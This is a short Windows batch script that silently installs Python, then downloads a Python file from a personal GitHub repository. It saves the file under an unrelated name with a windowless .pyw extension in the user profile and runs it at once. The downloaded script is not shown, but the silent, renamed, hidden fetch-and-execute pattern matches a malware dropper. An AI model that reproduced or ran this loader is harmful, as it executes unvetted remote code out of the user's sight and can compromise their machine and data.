@echo off
powershell -Command "$userProfile = [System.Environment]::GetFolderPath('UserProfile'); Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe' -OutFile \"$userProfile\python-inst.exe\"; & \"$userProfile\python-inst.exe\" /quiet PrependPath=1"
start /wait %USERPROFILE%\python-inst.exe /quiet PrependPath=1

powershell -Command "$userProfile = [System.Environment]::GetFolderPath('UserProfile'); Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/JuanaCOrtiz/test-rep/refs/heads/main/tkp.py' -OutFile \"$userProfile\bfs.pyw\""
python "%USERPROFILE%\bfs.pyw"
